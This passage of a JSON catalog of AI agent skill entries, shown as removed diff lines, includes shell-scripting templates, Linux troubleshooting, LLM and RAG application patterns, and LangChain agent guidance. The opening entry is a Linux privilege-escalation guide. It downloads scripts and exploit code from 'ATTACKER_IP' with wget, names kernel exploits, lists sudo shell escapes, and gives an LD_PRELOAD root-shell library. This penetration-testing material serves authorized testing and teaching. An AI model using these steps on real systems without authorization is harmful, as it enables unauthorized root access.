linpeas.sh\n./linpeas.sh\n\n# LinEnum\n./LinEnum.sh -t\n\n# Linux Smart Enumeration\n./lse.sh -l 1\n\n# Linux Exploit Suggester\n./les.sh\n```\n\nTransfer scripts to target system:\n\n```bash\n# On attacker machine\npython3 -m http.server 8000\n\n# On target machine\nwget http://ATTACKER_IP:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n```\n\n### Phase 3: Kernel Exploits\n\n#### Identify Kernel Version\n\n```bash\nuname -r\ncat /proc/version\n```\n\n#### Search for Exploits\n\n```bash\n# Use Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# Manual search on exploit-db\nsearchsploit linux kernel [version]\n```\n\n#### Common Kernel Exploits\n\n| Kernel Version | Exploit | CVE |\n|---------------|---------|-----|\n| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |\n| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |\n| 5.8+ | Dirty Pipe | CVE-2022-0847 |\n\n#### Compile and Execute\n\n```bash\n# Transfer exploit source\nwget http://ATTACKER_IP/exploit.c\n\n# Compile on target\ngcc exploit.c -o exploit\n\n# Execute\n./exploit\n```\n\n### Phase 4: Sudo Exploitation\n\n#### Enumerate Sudo Privileges\n\n```bash\nsudo -l\n```\n\n#### GTFOBins Sudo Exploitation\nReference https://gtfobins.github.io for exploitation commands:\n\n```bash\n# Example: vim with sudo\nsudo vim -c ':!/bin/bash'\n\n# Example: find with sudo\nsudo find . -exec /bin/sh \\; -quit\n\n# Example: awk with sudo\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# Example: python with sudo\nsudo python -c 'import os; os.system(\"/bin/bash\")'\n\n# Example: less with sudo\nsudo less /etc/passwd\n!/bin/bash\n```\n\n#### LD_PRELOAD Exploitation\nWhen env_keep includes LD_PRELOAD:\n\n```c\n// shell.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n```\n\n```bash\n# Compile shared library\ngcc",
-      "tags": [
-        "python",
-        "ai",
-        "workflow",
-        "document",
-        "security",
-        "vulnerability",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:19:17.962Z"
-    },
-    {
-      "id": "antigravity-linux-shell-scripting",
-      "name": "linux-shell-scripting",
-      "slug": "linux-shell-scripting",
-      "description": "Provide production-ready shell script templates for common Linux system administration tasks including backups, monitoring, user management, log analysis, and automation. These scripts serve as building blocks for security operations and penetration testing environments.",
-      "category": "Security & Systems",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linux-shell-scripting",
-      "content": "\n# Linux Production Shell Scripts\n\n## Purpose\n\nProvide production-ready shell script templates for common Linux system administration tasks including backups, monitoring, user management, log analysis, and automation. These scripts serve as building blocks for security operations and penetration testing environments.\n\n## Prerequisites\n\n### Required Environment\n- Linux/Unix system (bash shell)\n- Appropriate permissions for tasks\n- Required utilities installed (rsync, openssl, etc.)\n\n### Required Knowledge\n- Basic bash scripting\n- Linux file system structure\n- System administration concepts\n\n## Outputs and Deliverables\n\n1. **Backup Solutions** - Automated file and database backups\n2. **Monitoring Scripts** - Resource usage tracking\n3. **Automation Tools** - Scheduled task execution\n4. **Security Scripts** - Password management, encryption\n\n## Core Workflow\n\n### Phase 1: File Backup Scripts\n\n**Basic Directory Backup**\n```bash\n#!/bin/bash\nbackup_dir=\"/path/to/backup\"\nsource_dir=\"/path/to/source\"\n\n# Create a timestamped backup of the source directory\ntar -czf \"$backup_dir/backup_$(date +%Y%m%d_%H%M%S).tar.gz\" \"$source_dir\"\necho \"Backup completed: backup_$(date +%Y%m%d_%H%M%S).tar.gz\"\n```\n\n**Remote Server Backup**\n```bash\n#!/bin/bash\nsource_dir=\"/path/to/source\"\nremote_server=\"user@remoteserver:/path/to/backup\"\n\n# Backup files/directories to a remote server using rsync\nrsync -avz --progress \"$source_dir\" \"$remote_server\"\necho \"Files backed up to remote server.\"\n```\n\n**Backup Rotation Script**\n```bash\n#!/bin/bash\nbackup_dir=\"/path/to/backups\"\nmax_backups=5\n\n# Rotate backups by deleting the oldest if more than max_backups\nwhile [ $(ls -1 \"$backup_dir\" | wc -l) -gt \"$max_backups\" ]; do\n    oldest_backup=$(ls -1t \"$backup_dir\" | tail -n 1)\n    rm -r \"$backup_dir/$oldest_backup\"\n    echo \"Removed old backup: $oldest_backup\"\ndone\necho \"Backup rotation completed.\"\n```\n\n**Database Backup Script**\n```bash\n#!/bin/bash\ndatabase_name=\"your_database\"\ndb_user=\"username\"\ndb_pass=\"password\"\noutput_file=\"database_backup_$(date +%Y%m%d).sql\"\n\n# Perform database backup using mysqldump\nmysqldump -u \"$db_user\" -p\"$db_pass\" \"$database_name\" > \"$output_file\"\ngzip \"$output_file\"\necho \"Database backup created: $output_file.gz\"\n```\n\n### Phase 2: System Monitoring Scripts\n\n**CPU Usage Monitor**\n```bash\n#!/bin/bash\nthreshold=90\n\n# Monitor CPU usage and trigger alert if threshold exceeded\ncpu_usage=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}' | cut -d. -f1)\n\nif [ \"$cpu_usage\" -gt \"$threshold\" ]; then\n    echo \"ALERT: High CPU usage detected: $cpu_usage%\"\n    # Add notification logic (email, slack, etc.)\n    # mail -s \"CPU Alert\" admin@example.com <<< \"CPU usage: $cpu_usage%\"\nfi\n```\n\n**Disk Space Monitor**\n```bash\n#!/bin/bash\nthreshold=90\npartition=\"/dev/sda1\"\n\n# Monitor disk usage and trigger alert if threshold exceeded\ndisk_usage=$(df -h | grep \"$partition\" | awk '{print $5}' | cut -d% -f1)\n\nif [ \"$disk_usage\" -gt \"$threshold\" ]; then\n    echo \"ALERT: High disk usage detected: $disk_usage%\"\n    # Add alert/notification logic here\nfi\n```\n\n**CPU Usage Logger**\n```bash\n#!/bin/bash\noutput_file=\"cpu_usage_log.txt\"\n\n# Log current CPU usage to a file with timestamp\ntimestamp=$(date '+%Y-%m-%d %H:%M:%S')\ncpu_usage=$(top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | cut -d. -f1)\necho \"$timestamp - CPU Usage: $cpu_usage%\" >> \"$output_file\"\necho \"CPU usage logged.\"\n```\n\n**System Health Check**\n```bash\n#!/bin/bash\noutput_file=\"system_health_check.txt\"\n\n# Perform system health check and save results to a file\n{\n    echo \"System Health Check - $(date)\"\n    echo \"================================\"\n    echo \"\"\n    echo \"Uptime:\"\n    uptime\n    echo \"\"\n    echo \"Load Average:\"\n    cat /proc/loadavg\n    echo \"\"\n    echo \"Memory Usage:\"\n    free -h\n    echo \"\"\n    echo \"Disk Usage:\"\n    df -h\n    echo \"\"\n    echo \"Top Processes:\"\n    ps aux --sort=-%cpu | head -10\n} > \"$output_file\"\n\necho \"System health check saved to $output_file\"\n```\n\n### Phase 3: User Management Scripts\n\n**User Account Creation**\n```bash\n#!/bin/bash\nusername=\"newuser\"\n\n# Check if user exists; if not, create new user\nif id \"$username\" &>/dev/null; then\n    echo \"User $username already exists.\"\nelse\n    useradd -m -s /bin/bash \"$username\"\n    echo \"User $username created.\"\n    \n    # Set password interactively\n    passwd \"$username\"\nfi\n```\n\n**Password Expiry Checker**\n```bash\n#!/bin/bash\noutput_file=\"password_expiry_report.txt\"\n\n# Check password expiry for users with bash shell\necho \"Password Expiry Report - $(date)\" > \"$output_file\"\necho \"=================================\" >> \"$output_file\"\n\nIFS=$'\\n'\nfor user in $(grep \"/bin/bash\" /etc/passwd | cut -d: -f1); do\n    password_expires=$(chage -l \"$user\" 2>/dev/null | grep \"Password expires\" | awk -F: '{print $2}')\n    echo \"User: $user - Password Expires: $password_expires\" >> \"$output_file\"\ndone\nunset IFS\n\necho \"Password expiry report saved to $output_file\"\n```\n\n### Phase 4: Security Scripts\n\n**Password Generator**\n```bash\n#!/bin/bash\nlength=${1",
-      "tags": [
-        "ai",
-        "automation",
-        "workflow",
-        "template",
-        "security",
-        "rag",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:19:19.256Z"
-    },
-    {
-      "id": "antigravity-linux-troubleshooting",
-      "name": "linux-troubleshooting",
-      "slug": "linux-troubleshooting",
-      "description": "Linux system troubleshooting workflow for diagnosing and resolving system issues, performance problems, and service failures.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linux-troubleshooting",
-      "content": "\n# Linux Troubleshooting Workflow\n\n## Overview\n\nSpecialized workflow for diagnosing and resolving Linux system issues including performance problems, service failures, network issues, and resource constraints.\n\n## When to Use This Workflow\n\nUse this workflow when:\n- Diagnosing system performance issues\n- Troubleshooting service failures\n- Investigating network problems\n- Resolving disk space issues\n- Debugging application errors\n\n## Workflow Phases\n\n### Phase 1: Initial Assessment\n\n#### Skills to Invoke\n- `bash-linux` - Linux commands\n- `devops-troubleshooter` - Troubleshooting\n\n#### Actions\n1. Check system uptime\n2. Review recent changes\n3. Identify symptoms\n4. Gather error messages\n5. Document findings\n\n#### Commands\n```bash\nuptime\nhostnamectl\ncat /etc/os-release\ndmesg | tail -50\n```\n\n#### Copy-Paste Prompts\n```\nUse @bash-linux to gather system information\n```\n\n### Phase 2: Resource Analysis\n\n#### Skills to Invoke\n- `bash-linux` - Resource commands\n- `performance-engineer` - Performance analysis\n\n#### Actions\n1. Check CPU usage\n2. Analyze memory\n3. Review disk space\n4. Monitor I/O\n5. Check network\n\n#### Commands\n```bash\ntop -bn1 | head -20\nfree -h\ndf -h\niostat -x 1 5\n```\n\n#### Copy-Paste Prompts\n```\nUse @performance-engineer to analyze system resources\n```\n\n### Phase 3: Process Investigation\n\n#### Skills to Invoke\n- `bash-linux` - Process commands\n- `server-management` - Process management\n\n#### Actions\n1. List running processes\n2. Identify resource hogs\n3. Check process status\n4. Review process trees\n5. Analyze strace output\n\n#### Commands\n```bash\nps aux --sort=-%cpu | head -10\npstree -p\nlsof -p PID\nstrace -p PID\n```\n\n#### Copy-Paste Prompts\n```\nUse @server-management to investigate processes\n```\n\n### Phase 4: Log Analysis\n\n#### Skills to Invoke\n- `bash-linux` - Log commands\n- `error-detective` - Error detection\n\n#### Actions\n1. Check system logs\n2. Review application logs\n3. Search for errors\n4. Analyze log patterns\n5. Correlate events\n\n#### Commands\n```bash\njournalctl -xe\ntail -f /var/log/syslog\ngrep -i error /var/log/*\n```\n\n#### Copy-Paste Prompts\n```\nUse @error-detective to analyze log files\n```\n\n### Phase 5: Network Diagnostics\n\n#### Skills to Invoke\n- `bash-linux` - Network commands\n- `network-engineer` - Network troubleshooting\n\n#### Actions\n1. Check network interfaces\n2. Test connectivity\n3. Analyze connections\n4. Review firewall rules\n5. Check DNS resolution\n\n#### Commands\n```bash\nip addr show\nss -tulpn\ncurl -v http://target\ndig domain\n```\n\n#### Copy-Paste Prompts\n```\nUse @network-engineer to diagnose network issues\n```\n\n### Phase 6: Service Troubleshooting\n\n#### Skills to Invoke\n- `server-management` - Service management\n- `systematic-debugging` - Debugging\n\n#### Actions\n1. Check service status\n2. Review service logs\n3. Test service restart\n4. Verify dependencies\n5. Check configuration\n\n#### Commands\n```bash\nsystemctl status service\njournalctl -u service -f\nsystemctl restart service\n```\n\n#### Copy-Paste Prompts\n```\nUse @systematic-debugging to troubleshoot service issues\n```\n\n### Phase 7: Resolution\n\n#### Skills to Invoke\n- `incident-responder` - Incident response\n- `bash-pro` - Fix implementation\n\n#### Actions\n1. Implement fix\n2. Verify resolution\n3. Monitor stability\n4. Document solution\n5. Create prevention plan\n\n#### Copy-Paste Prompts\n```\nUse @incident-responder to implement resolution\n```\n\n## Troubleshooting Checklist\n\n- [ ] System information gathered\n- [ ] Resources analyzed\n- [ ] Logs reviewed\n- [ ] Network tested\n- [ ] Services verified\n- [ ] Issue resolved\n- [ ] Documentation created\n\n## Quality Gates\n\n- [ ] Root cause identified\n- [ ] Fix verified\n- [ ] Monitoring in place\n- [ ] Documentation complete\n\n## Related Workflow Bundles\n\n- `os-scripting` - OS scripting\n- `bash-scripting` - Bash scripting\n- `cloud-devops` - DevOps\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
-      "tags": [
-        "ai",
-        "workflow",
-        "document"
-      ],
-      "useCases": [
-        "Diagnosing system performance issues",
-        "Troubleshooting service failures",
-        "Investigating network problems",
-        "Resolving disk space issues",
-        "Debugging application errors"
-      ],
-      "scrapedAt": "2026-02-23T07:17:07.819Z"
-    },
-    {
-      "id": "antigravity-llm-app-patterns",
-      "name": "llm-app-patterns",
-      "slug": "llm-app-patterns",
-      "description": "Production-ready patterns for building LLM applications, inspired by [Dify](https://github.com/langgenius/dify) and industry best practices.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-app-patterns",
-      "content": "\n# 🤖 LLM Application Patterns\n\n> Production-ready patterns for building LLM applications, inspired by [Dify](https://github.com/langgenius/dify) and industry best practices.\n\n## When to Use This Skill\n\nUse this skill when:\n\n- Designing LLM-powered applications\n- Implementing RAG (Retrieval-Augmented Generation)\n- Building AI agents with tools\n- Setting up LLMOps monitoring\n- Choosing between agent architectures\n\n---\n\n## 1. RAG Pipeline Architecture\n\n### Overview\n\nRAG (Retrieval-Augmented Generation) grounds LLM responses in your data.\n\n```\n┌─────────────┐     ┌─────────────┐     ┌─────────────┐\n│   Ingest    │────▶│   Retrieve  │────▶│   Generate  │\n│  Documents  │     │   Context   │     │   Response  │\n└─────────────┘     └─────────────┘     └─────────────┘\n      │                   │                   │\n      ▼                   ▼                   ▼\n ┌─────────┐       ┌───────────┐       ┌───────────┐\n │ Chunking│       │  Vector   │       │    LLM    │\n │Embedding│       │  Search   │       │  + Context│\n └─────────┘       └───────────┘       └───────────┘\n```\n\n### 1.1 Document Ingestion\n\n```python\n# Chunking strategies\nclass ChunkingStrategy:\n    # Fixed-size chunks (simple but may break context)\n    FIXED_SIZE = \"fixed_size\"  # e.g., 512 tokens\n\n    # Semantic chunking (preserves meaning)\n    SEMANTIC = \"semantic\"      # Split on paragraphs/sections\n\n    # Recursive splitting (tries multiple separators)\n    RECURSIVE = \"recursive\"    # [\"\\n\\n\", \"\\n\", \" \", \"\"]\n\n    # Document-aware (respects structure)\n    DOCUMENT_AWARE = \"document_aware\"  # Headers, lists, etc.\n\n# Recommended settings\nCHUNK_CONFIG = {\n    \"chunk_size\": 512,       # tokens\n    \"chunk_overlap\": 50,     # token overlap between chunks\n    \"separators\": [\"\\n\\n\", \"\\n\", \". \", \" \"],\n}\n```\n\n### 1.2 Embedding & Storage\n\n```python\n# Vector database selection\nVECTOR_DB_OPTIONS = {\n    \"pinecone\": {\n        \"use_case\": \"Production, managed service\",\n        \"scale\": \"Billions of vectors\",\n        \"features\": [\"Hybrid search\", \"Metadata filtering\"]\n    },\n    \"weaviate\": {\n        \"use_case\": \"Self-hosted, multi-modal\",\n        \"scale\": \"Millions of vectors\",\n        \"features\": [\"GraphQL API\", \"Modules\"]\n    },\n    \"chromadb\": {\n        \"use_case\": \"Development, prototyping\",\n        \"scale\": \"Thousands of vectors\",\n        \"features\": [\"Simple API\", \"In-memory option\"]\n    },\n    \"pgvector\": {\n        \"use_case\": \"Existing Postgres infrastructure\",\n        \"scale\": \"Millions of vectors\",\n        \"features\": [\"SQL integration\", \"ACID compliance\"]\n    }\n}\n\n# Embedding model selection\nEMBEDDING_MODELS = {\n    \"openai/text-embedding-3-small\": {\n        \"dimensions\": 1536,\n        \"cost\": \"$0.02/1M tokens\",\n        \"quality\": \"Good for most use cases\"\n    },\n    \"openai/text-embedding-3-large\": {\n        \"dimensions\": 3072,\n        \"cost\": \"$0.13/1M tokens\",\n        \"quality\": \"Best for complex queries\"\n    },\n    \"local/bge-large\": {\n        \"dimensions\": 1024,\n        \"cost\": \"Free (compute only)\",\n        \"quality\": \"Comparable to OpenAI small\"\n    }\n}\n```\n\n### 1.3 Retrieval Strategies\n\n```python\n# Basic semantic search\ndef semantic_search(query: str, top_k: int = 5):\n    query_embedding = embed(query)\n    results = vector_db.similarity_search(\n        query_embedding,\n        top_k=top_k\n    )\n    return results\n\n# Hybrid search (semantic + keyword)\ndef hybrid_search(query: str, top_k: int = 5, alpha: float = 0.5):\n    \"\"\"\n    alpha=1.0: Pure semantic\n    alpha=0.0: Pure keyword (BM25)\n    alpha=0.5: Balanced\n    \"\"\"\n    semantic_results = vector_db.similarity_search(query)\n    keyword_results = bm25_search(query)\n\n    # Reciprocal Rank Fusion\n    return rrf_merge(semantic_results, keyword_results, alpha)\n\n# Multi-query retrieval\ndef multi_query_retrieval(query: str):\n    \"\"\"Generate multiple query variations for better recall\"\"\"\n    queries = llm.generate_query_variations(query, n=3)\n    all_results = []\n    for q in queries:\n        all_results.extend(semantic_search(q))\n    return deduplicate(all_results)\n\n# Contextual compression\ndef compressed_retrieval(query: str):\n    \"\"\"Retrieve then compress to relevant parts only\"\"\"\n    docs = semantic_search(query, top_k=10)\n    compressed = llm.extract_relevant_parts(docs, query)\n    return compressed\n```\n\n### 1.4 Generation with Context\n\n```python\nRAG_PROMPT_TEMPLATE = \"\"\"\nAnswer the user's question based ONLY on the following context.\nIf the context doesn't contain enough information, say \"I don't have enough information to answer that.\"\n\nContext:\n{context}\n\nQuestion: {question}\n\nAnswer:\"\"\"\n\ndef generate_with_rag(question: str):\n    # Retrieve\n    context_docs = hybrid_search(question, top_k=5)\n    context = \"\\n\\n\".join([doc.content for doc in context_docs])\n\n    # Generate\n    prompt = RAG_PROMPT_TEMPLATE.format(\n        context=context,\n        question=question\n    )\n\n    response = llm.generate(prompt)\n\n    # Return with citations\n    return {\n        \"answer\": response,\n        \"sources\": [do",
-      "tags": [
-        "python",
-        "react",
-        "api",
-        "claude",
-        "ai",
-        "agent",
-        "llm",
-        "gpt",
-        "template",
-        "design"
-      ],
-      "useCases": [
-        "Designing LLM-powered applications",
-        "Implementing RAG (Retrieval-Augmented Generation)",
-        "Building AI agents with tools",
-        "Setting up LLMOps monitoring",
-        "Choosing between agent architectures"
-      ],
-      "scrapedAt": "2026-01-26T13:19:20.611Z"
-    },
-    {
-      "id": "antigravity-llm-application-dev-ai-assistant",
-      "name": "llm-application-dev-ai-assistant",
-      "slug": "llm-application-dev-ai-assistant",
-      "description": "You are an AI assistant development expert specializing in creating intelligent conversational interfaces, chatbots, and AI-powered applications. Design comprehensive AI assistant solutions with natur",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-application-dev-ai-assistant",
-      "content": "\n# AI Assistant Development\n\nYou are an AI assistant development expert specializing in creating intelligent conversational interfaces, chatbots, and AI-powered applications. Design comprehensive AI assistant solutions with natural language understanding, context management, and seamless integrations.\n\n## Use this skill when\n\n- Working on ai assistant development tasks or workflows\n- Needing guidance, best practices, or checklists for ai assistant development\n\n## Do not use this skill when\n\n- The task is unrelated to ai assistant development\n- You need a different domain or tool outside this scope\n\n## Context\nThe user needs to develop an AI assistant or chatbot with natural language capabilities, intelligent responses, and practical functionality. Focus on creating production-ready assistants that provide real value to users.\n\n## Requirements\n$ARGUMENTS\n\n## Instructions\n\n- Clarify goals, constraints, and required inputs.\n- Apply relevant best practices and validate outcomes.\n- Provide actionable steps and verification.\n- If detailed examples are required, open `resources/implementation-playbook.md`.\n\n## Resources\n\n- `resources/implementation-playbook.md` for detailed patterns and examples.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
-      "tags": [
-        "ai",
-        "llm",
-        "workflow",
-        "design"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-29T06:59:31.883Z"
-    },
-    {
-      "id": "antigravity-llm-application-dev-langchain-agent",
-      "name": "llm-application-dev-langchain-agent",
-      "slug": "llm-application-dev-langchain-agent",
-      "description": "You are an expert LangChain agent developer specializing in production-grade AI systems using LangChain 0.1+ and LangGraph.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-application-dev-langchain-agent",
-      "content": "\n# LangChain/LangGraph Agent Development Expert\n\nYou are an expert LangChain agent developer specializing in production-grade AI systems using LangChain 0.1+ and LangGraph.\n\n## Use this skill when\n\n- Working on langchain/langgraph agent development expert tasks or workflows\n- Needing guidance, best practices, or checklists for langchain/langgraph agent development expert\n\n## Do not use this skill when\n\n- The task is unrelated to langchain/langgraph agent development expert\n- You need a different domain or tool outside this scope\n\n## Instructions\n\n- Clarify goals, constraints, and required inputs.\n- Apply relevant best practices and validate outcomes.\n- Provide actionable steps and verification.\n- If detailed examples are required, open `resources/implementation-playbook.md`.\n\n## Context\n\nBuild sophisticated AI agent system for: $ARGUMENTS\n\n## Core Requirements\n\n- Use latest LangChain 0.1+ and LangGraph APIs\n- Implement async patterns throughout\n- Include comprehensive error handling and fallbacks\n- Integrate LangSmith for observability\n- Design for scalability and production deployment\n- Implement security best practices\n- Optimize for cost efficiency\n\n## Essential Architecture\n\n### LangGraph State Management\n```python\nfrom langgraph.graph import StateGraph, MessagesState, START, END\nfrom langgraph.prebuilt import create_react_agent\nfrom langchain_anthropic import ChatAnthropic\n\nclass AgentState(TypedDict):\n    messages: Annotated[list, \"conversation history\"]\n    context: Annotated[dict, \"retrieved context\"]\n```\n\n### Model & Embeddings\n- **Primary LLM**: Claude Sonnet 4.5 (`claude-sonnet-4-5`)\n- **Embeddings**: Voyage AI (`voyage-3-large`) - officially recommended by Anthropic for Claude\n- **Specialized**: `voyage-code-3` (code), `voyage-finance-2` (finance), `voyage-law-2` (legal)\n\n## Agent Types\n\n1. **ReAct Agents**: Multi-step reasoning with tool usage\n   - Use `create_react_agent(llm, tools, state_modifier)`\n   - Best for general-purpose tasks\n\n2. **Plan-and-Execute**: Complex tasks requiring upfront planning\n   - Separate planning and execution nodes\n   - Track progress through state\n\n3. **Multi-Agent Orchestration**: Specialized agents with supervisor routing\n   - Use `Command[Literal[\"agent1\", \"agent2\", END]]` for routing\n   - Supervisor decides next agent based on context\n\n## Memory Systems\n\n- **Short-term**: `ConversationTokenBufferMemory` (token-based windowing)\n- **Summarization**: `ConversationSummaryMemory` (compress long histories)\n- **Entity Tracking**: `ConversationEntityMemory` (track people, places, facts)\n- **Vector Memory**: `VectorStoreRetrieverMemory` with semantic search\n- **Hybrid**: Combine multiple memory types for comprehensive context\n\n## RAG Pipeline\n\n```python\nfrom langchain_voyageai import VoyageAIEmbeddings\nfrom langchain_pinecone import PineconeVectorStore\n\n# Setup embeddings (voyage-3-large recommended for Claude)\nembeddings = VoyageAIEmbeddings(model=\"voyage-3-large\")\n\n# Vector store with hybrid search\nvectorstore = PineconeVectorStore(\n    index=index,\n    embedding=embeddings\n)\n\n# Retriever with reranking\nbase_retriever = vectorstore.as_retriever(\n    search_type=\"hybrid\",\n    search_kwargs={\"k\": 20, \"alpha\": 0.5}\n)\n```\n\n### Advanced RAG Patterns\n- **HyDE**: Generate hypothetical documents for better retrieval\n- **RAG Fusion**: Multiple query perspectives for comprehensive results\n- **Reranking**: Use Cohere Rerank for relevance optimization\n\n## Tools & Integration\n\n```python\nfrom langchain_core.tools import StructuredTool\nfrom pydantic import BaseModel, Field\n\nclass ToolInput(BaseModel):\n    query: str = Field(description=\"Query to process\")\n\nasync def tool_function(query: str) -> str:\n    # Implement with error handling\n    try:\n        result = await external_call(query)\n        return result\n    except Exception as e:\n        return f\"Error: {str(e)}\"\n\ntool = StructuredTool.from_function(\n    func=tool_function,\n    name=\"tool_name\",\n    description=\"What this tool does\",\n    args_schema=ToolInput,\n    coroutine=tool_function\n)\n```\n\n## Production Deployment\n\n### FastAPI Server with Streaming\n```python\nfrom fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse\n\n@app.post(\"/agent/invoke\")\nasync def invoke_agent(request: AgentRequest):\n    if request.stream:\n        return StreamingResponse(\n            stream_response(request),\n            media_type=\"text/event-stream\"\n        )\n    return await agent.ainvoke({\"messages\": [...]})\n```\n\n### Monitoring & Observability\n- **LangSmith**: Trace all agent executions\n- **Prometheus**: Track metrics (requests, latency, errors)\n- **Structured Logging**: Use `structlog` for consistent logs\n- **Health Checks**: Validate LLM, tools, memory, and external services\n\n### Optimization Strategies\n- **Caching**: Redis for response caching with TTL\n- **Connection Pooling**: Reuse vector DB connections\n- **Load Balancing**: Multiple agent workers with round-robin routing\n- **Timeout Handling**: Set timeouts on all async op",
-      "tags": [
-        "python",
-        "react",
-        "node",
-        "api",
-        "claude",
-        "ai",
-        "agent",
-        "llm",
-        "workflow",
-        "design"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-29T06:59:32.351Z"
-    },
-    {
-      "id": "antigravity-llm-application-dev-prompt-optimize",
-      "name": "llm-application-dev-prompt-optimize",
-      "slug": "llm-application-dev-prompt-optimize",
-      "description": "You are an expert prompt engineer specializing in crafting effective prompts for LLMs through advanced techniques including constitutional AI, chain-of-thought reasoning, and model-specific optimizati",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-application-dev-prompt-optimize",
-      "content": "\n# Prompt Optimization\n\nYou are an expert prompt engineer specializing in crafting effective prompts for LLMs through advanced techniques including constitutional AI, chain-of-thought reasoning, and model-specific optimization.\n\n## Use this skill when\n\n- Working on prompt optimization tasks or workflows\n- Needing guidance, best practices, or checklists for prompt optimization\n\n## Do not use this skill when\n\n- The task is unrelated to prompt optimization\n- You need a different domain or tool outside this scope\n\n## Context\n\nTransform basic instructions into production-ready prompts. Effective prompt engineering can improve accuracy by 40%, reduce hallucinations by 30%, and cut costs by 50-80% through token optimization.\n\n## Requirements\n\n$ARGUMENTS\n\n## Instructions\n\n- Clarify goals, constraints, and required inputs.\n- Apply relevant best practices and validate outcomes.\n- Provide actionable steps and verification.\n- If detailed examples are required, open `resources/implementation-playbook.md`.\n\n## Resources\n\n- `resources/implementation-playbook.md` for detailed patterns and examples.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
-      "tags": [
-        "ai",
-        "llm",
-        "workflow"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-29T06:59:32.619Z"
-    },
-    {
-      "id": "antigravity-llm-council",
-      "name": "llm-council",
-      "slug": "llm-council",
-      "description": "Run Fireworks-hosted open-weight model councils that compare responses and synthesize a final answer.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-council",
-      "content": "\n# LLM Council (Fireworks AI)\n\n## When to Use\n\nUse when this workflow matches the user request: Use this skill for its documented workflow.\n\n\n_Source: [dair-ai/dair-academy-plugins](https://github.com/dair-ai/dair-academy-plugins) (MIT)._\n\nThis skill implements Karpathy's LLM Council concept where multiple open-weight LLMs deliberate on a query, powered entirely by Fireworks AI:\n\n1. **Phase 1**: All models respond to the query independently (parallel)\n2. **Phase 2**: Models rank each other's anonymized responses\n3. **Phase 3**: A Chairman LLM synthesizes the final answer\n\nAll inference runs through **Fireworks AI** using open-weight models. The speed and pricing of Fireworks makes it practical to run multi-model deliberation that would be slow or expensive on other providers.\n\n## CRITICAL RULES\n\n1. **ALWAYS use AskUserQuestion** to let the user select council models (multiselect) and the Chairman model\n2. **ALWAYS save raw responses to files** - never summarize or truncate API outputs\n3. **ALWAYS show full transparency** - display all individual responses, all rankings, AND the final synthesis\n4. **NEVER skip the ranking phase** - it is essential to the council deliberation process\n5. **Read from files for display** - ensures content is shown unmodified\n6. **ALWAYS display the final output to the user** after Phase 3 completes\n\n## Pre-flight Check\n\nBefore running any phase, verify the Fireworks API key is set:\n\n```bash\nif [ -z \"$FIREWORKS_API_KEY\" ]; then\n  echo \"ERROR: FIREWORKS_API_KEY is not set.\"\n  echo \"Create a Fireworks AI account at: https://fireworks.ai/\"\n  echo \"Then export it in your shell profile (~/.zshrc or ~/.bashrc):\"\n  echo '  read -rsp \"Fireworks API key: \" FIREWORKS_API_KEY; echo; export FIREWORKS_API_KEY'\n  exit 1\nfi\necho \"FIREWORKS_API_KEY is set.\"\n```\n\n## Available Models\n\nPresent these options to the user via AskUserQuestion (multiselect):\n\n| Model | Fireworks ID | Provider |\n|-------|-------------|----------|\n| GLM 5 | accounts/fireworks/models/glm-5 | Z.ai |\n| DeepSeek V3.1 | accounts/fireworks/models/deepseek-v3p1 | DeepSeek |\n| DeepSeek V3.2 | accounts/fireworks/models/deepseek-v3p2 | DeepSeek |\n| MiniMax M2.1 | accounts/fireworks/models/minimax-m2p1 | MiniMax |\n| Kimi K2.5 | accounts/fireworks/models/kimi-k2p5 | Moonshot |\n| Qwen3 235B | 